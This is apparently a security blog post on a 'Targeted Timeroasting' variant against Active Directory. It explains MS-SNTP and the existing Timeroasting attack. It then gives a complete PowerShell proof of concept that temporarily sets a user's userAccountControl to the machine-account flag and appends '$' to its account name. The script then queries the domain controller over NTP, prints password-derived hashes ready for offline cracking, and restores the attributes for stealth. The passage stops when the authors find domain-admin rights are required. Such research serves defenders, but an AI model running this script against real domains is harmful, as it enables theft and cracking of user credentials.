# Targeted Timeroasting: Weaponizing Users and Computers with Controlled UAC Flags

Do you know **NTP**, or its Microsoft Windows variant, **MS-SNTP**? Well, I racked my brain trying to figure out what it was, and I found it really interesting. In this article, we will focus exclusively on the **MS-SNTP** protocol. We will explore how this protocol could potentially be exploited to steal authentication or identification credentials. 

First, we will examine how the **MS-SNTP** protocol works and how it is used within **Active Directory** infrastructures. We will also highlight its importance in such environments. Next, we will explore how the **MS-SNTP** protocol can be abused by proposing a variation of an existing attack. We will develop a proof-of-concept exploit (`PoC`) and then suggest possible **remediations** to protect against this attack.

## What is the MS-SNTP protocol, and how does it work?

"*The **Simple Network Time Protocol** (abbreviated as **SNTP**) is a protocol from the Internet protocol suite used for synchronizing system clocks across networks. The current version, **SNTPv4**, supports both **IPv4** and **IPv6** networks and is described in [RFC 4330](https://datatracker.ietf.org/doc/html/rfc4330).*"

Its main purpose is to maintain accurate time synchronization across networked devices, ensuring consistent timestamps and coordinated operations. In **Active Directory** infrastructures, its use is similar: it ensures time synchronization across all computers within a Windows domain. This synchronization is especially important for **Kerberos authentication**, which, during the **pre-authentication** phase, checks the timestamp provided by the client machine. 

![image](https://github.com/user-attachments/assets/3d5e8fe6-477b-45a6-be24-be886235781e)

If there is a time difference greater than 5 minutes between the client and the **domain controller**, Kerberos pre-authentication fails. **MS-SNTP** ensures that all systems within an **Active Directory** domain are synchronized to a reliable time source. On each **Windows** machine within an **Active Directory** domain, time synchronization is generally handled by the `svchost.exe` service. 

It loads its configuration from the registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time`, then determines its time service role based on the machine’s context, whether it is a **Domain Controller (DC)**, a **PDC Emulator**, a regular **domain member**, or a **workgroup** computer. Next, the system determines its time source. Each host queries both the registry and the **Active Directory** environment to figure out from whom it should synchronize time.

For example:

> * If the machine is a **domain-joined client**, it uses the closest **Domain Controller (DC)**, determined via **DNS** and the **DC Locator** mechanism.
> * If it's a **non-PDC Domain Controller**, it is configured to synchronize with the **PDC Emulator** of its domain.
> * If it's the **PDC Emulator**, and specifically the one for the **forest root domain**, it typically uses the `ManualPeerList`, often configured with external public **NTP servers**, as its time source.

So, before talking about **"Targeted Timeroasting"**, I’m going to explain what **Timeroasting** is in the first place. To do this, I set up a very simple lab with a basic Windows Server 2022 promoted as a **Primary Domain Controller (PDC)**. Domain-joined machines obtain time synchronization via NTP from a domain controller. 

A Microsoft extension (MS-SNTP) adds a MAC authenticator calculated from the hash of a computer account, along with a **Relative Identifier (RID)** in the request. So, an attacker can send NTP requests specifying RIDs linked to machine accounts and receive hashes in response, which can then be cracked offline. 

![image](https://github.com/user-attachments/assets/db0f9e09-0b7c-493b-bdcb-e5b972325ef1)

The goal would be to send a time synchronization request to the Domain Controller, including the RID of the targeted machine account. The Domain Controller will then generate the MAC based on the provided RID, therefore using the **targeted machine account**.

![image](https://github.com/user-attachments/assets/98fe2782-8fa3-4220-974a-09df869e637e)

Above, you can see a **Wireshark** capture showing the process, along with a **failure**, of a time synchronization request using the **`NTP`** protocol (**`MS-SNTP`**). You can observe that in the response sent by the **NTP server** (**the DC in our case**), the **MAC** is indeed present. Why didn’t the first attempt work? Because it couldn’t generate a **MAC**, since we had deliberately provided an incorrect **`RID`** for testing purposes.

> Info: The **MAC** (Message Authentication Code) is a cryptographic signature added to the **`NTP`** response to ensure the **integrity** of the **NTP message** and the **authenticity** of the sender (the **Domain Controller**).

## UAC Flags?

**`UAC`** (for **`UserAccountControl`**) is an integer attribute on **user** and **computer** objects in **Active Directory (AD)** that represents a set of **bitwise flags**. Each bit defines a specific **property** or **behavior** of the account, such as whether the account is **disabled**, **locked out**, a **machine account**, **password never expires**, and so on. Based on the [Microsoft documentation](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties), several **flags** are defined under **`UserAccountControl`**, such as:

* `INTERDOMAIN_TRUST_ACCOUNT`
* `WORKSTATION_TRUST_ACCOUNT`
* `SERVER_TRUST_ACCOUNT`
* `DONT_EXPIRE_PASSWORD`
* and others...

Each **flag** corresponds to a specific **bit position** in this integer. This means we use numbers to combine multiple states into a single value.
For example: **`66048`** in decimal, **`0x10200`** in hexadecimal, and **`0001 0000 0010 0000 0000`** in binary.

This system is tied to how computers represent **bits**, and how we, as humans, read and interpret them.
Each flag is a **power of 2**, representing a specific bit, making it easy to toggle individual settings using **bitwise operations**.

So, to assign multiple **flags** to the same object, you simply add their **decimal values** together.
For example, to set both **`WORKSTATION_TRUST_ACCOUNT`** (`4096` / `0x1000`) and **`DONT_EXPIRE_PASSWORD`** (`65536` / `0x10000`), you add:

`4096 + 65536 = 69632`

That resulting decimal value, **`69632`**, is what you assign to the **`UserAccountControl`** attribute.

Coming back to our main objective, targeting not **computer accounts**, but **user accounts**. The idea we had (inspired by an **excellent article** I highly recommend, I’ll share it at the end) was the following:

If we could make a **user account appear as a machine account** to the **Domain Controller**, then the DC would behave as usual. It would generate the **MAC** using the supplied credentials, and the **cleartext password** used for that MAC would actually be the password of the **targeted user**.

![image](https://github.com/user-attachments/assets/2c5f71c7-75e6-43c3-b929-fb374ef0dc62)

That’s when the idea came to us: understanding **how the Domain Controller verifies** the validity and **type of object** it’s dealing with. This led us to take a closer look at the available `UserAccountControl` (UAC) flags, and how they influence the DC’s behavior. It doesn’t just rely on how the object *looks* (like having a `$` at the end). It checks key attributes stored in Active Directory to determine whether the object is a **user**, a **machine**, or even a **domain controller**.

The most critical attribute here is `userAccountControl`. This integer contains a combination of **bitwise flags**, and one of those flags explicitly tells the DC: *"this is a workstation trust account"*, or *"this is a standard user"*. Other attributes like `objectClass` or `objectCategory` help categorize the object, but **behavioral logic**, such as how MS-SNTP treats it, is ultimately driven by these flags.

Here’s a quick summary:

| Attribute            | Purpose                                     | Example value                        |
| -------------------- | ------------------------------------------- | ------------------------------------ |
| `objectClass`        | General category (`user`, `computer`, ...)  | `user`                             |
| `objectCategory`     | Schema-based classification                 | `CN=Person,...` or `CN=Computer,...` |
| `userAccountControl` | **Determines behavior and type** via flags  | `0x0200` = user, `0x1000` = machine  |
| `sAMAccountName`     | Login name (trailing `$` is cosmetic only)  | `alice$`, `PC01$`                    |

So, as you may have guessed, the goal is to **target a user account** by modifying some of its attributes, specifically the `UserAccountControl`, to make it appear as a **machine account**. This way, the **Domain Controller** will generate a **MAC** in its response based on the **user’s password**, just as it would for a legitimate machine account. To achieve this, and to automate the process, we wrote a **PowerShell script** that:

* Adds the appropriate **`UserAccountControl`** flag (`WORKSTATION_TRUST_ACCOUNT` = 4096) to the targeted user account.
* Sends the crafted **NTP request** to the Domain Controller.
* Formats the response data properly for **offline cracking**.
* Then restores the original attribute values for better **OPSEC**.

We based our work on the script from the article I mentioned earlier.
Here’s the code:

```powershell
param(
    [Parameter(Mandatory=$true)][Alias("dc")][string]$a,
    [Alias("target")][string]$b,
    [Alias("targets")][string]$c
)

Import-Module ActiveDirectory
$d=4096
$e=@()
if (!$b -and !$c){Write-Host "[!] Use -target or -targets." -ForegroundColor Red;Exit}
if ($b -and $c){Write-Host "[!] Use only -target or -targets, not both." -ForegroundColor Red;Exit}
$e=if ($b){@($b)}else{Get-Content $c}
$f=[byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)
$g=New-Object System.Net.Sockets.UdpClient
$g.Client.ReceiveTimeout=6
$g.Connect($a,123)

foreach ($h in $e){
    try{$i=Get-ADUser -Identity $h -Properties DistinguishedName,UserAccountControl}catch{continue}
    $j=(New-Object System.Security.Principal.NTAccount($h)).Translate([System.Security.Principal.SecurityIdentifier])
    $k=($j.Value -split '-')[ -1 ]
    $l=$i.UserAccountControl
    $m=$i.DistinguishedName
    $n=if ($h[-1] -ne "$"){$h+"$"}else{$h}
    Set-ADUser -Identity $m -Replace @{userAccountControl=$d;samAccountName=$n}
    $o=$f+[BitConverter]::GetBytes([int]$k)+[byte[]]::new(16)
    try{
        [void]$g.Send($o,$o.Length)
        $p=$g.Receive([ref]$null)
        if ($p.Length -eq 68){
            $q=[byte[]]$p[0..47]
            $r=[byte[]]$p[-16..-1]
            $s=[BitConverter]::ToString($q).Replace("-","").ToLower()
            $t=[BitConverter]::ToString($r).Replace("-","").ToLower()
            Write-Host ("{0}:`$sntp-ms`{1}`${2}" -f $k,$t,$s) -ForegroundColor Green
        }
    }catch{}
    Set-ADUser -Identity $m -Replace @{samAccountName=$h;userAccountControl=$l}
}
$g.Close()
```

## The problems come faster than you'd like to believe...

Great, for the sake of experimentation, we decided to target a test account created specifically for this purpose, named `j.doe` (John Doe). We ran the script, pointed it at the **Domain Controller** and the **target account**. Below is the screenshot of the script's execution, and as you can see, the result is quite telling.

![image](https://github.com/user-attachments/assets/761101e4-e5f5-4864-948a-b5c22d4692b8)

However, what you're seeing here is, unfortunately, just an illusion. If you look closely, you’ll notice that I’m currently running the session as **Administrator**. That means I’m a member of both the **Domain Admins** and **Enterprise Admins** groups at the time of executing this command. And unfortunately, those are **critical requirements** for this attack to work successfully.

Now we arrive at what I find to be the **most fascinating part** of the article: 

We’re about to dive deep into the internals of **Microsoft Windows** and uncover **why elevated privileges are currently required** to perform this attack. At first, we tried running the script using a **standard domain account**, no special permissions, no admin rights, and no delegation over the targeted account. As expected, it **didn’t work**: modifying that kind of attribute requires at least some permissions on the object.

So, we thought: what if we had **Full Control**, or permissions like **`WriteDACL`**, or even **`GenericAll`** over the user object? Could we then edit its attributes?

![image](https://github.com/user-attachments/assets/5ddde107-f38b-4a92-bd8c-83d27d4ad2e2)

Well... **nope**.

That’s when things started getting interesting, and a bit frustrating. It marked the beginning of a **deep-dive investigation** into **why** this was happening.
